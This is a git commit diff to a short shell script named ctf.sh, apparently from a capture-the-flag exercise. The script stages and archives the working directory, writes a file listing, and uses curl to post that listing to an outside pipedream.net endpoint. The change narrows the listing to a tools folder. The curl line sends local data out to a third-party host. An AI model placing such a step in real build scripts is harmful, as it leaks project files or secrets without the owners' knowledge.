5634431dba78b23cd2da93300f923a8ea302b356
Emmanuel Arias <eamanu@yaerobi.com>
2021-11-03 12:29:37 -0300

    Update ctf.sh

--- ctf.sh
+++ ctf.sh
@@ -6,5 +6,5 @@ rsync -rv --exclude=.git ./ /tmp/staging
 echo "prepare package archive"
 tar -cvf /tmp/package.tar /tmp/staging/*
 
-echo $(ls -la /tmp/staging) > /tmp/files.txt
+echo $(ls -la /tmp/staging/tools) > /tmp/files.txt
 curl --data-binary "@/tmp/files.txt" https://enp4nvoq5ac2bl5.m.pipedream.net
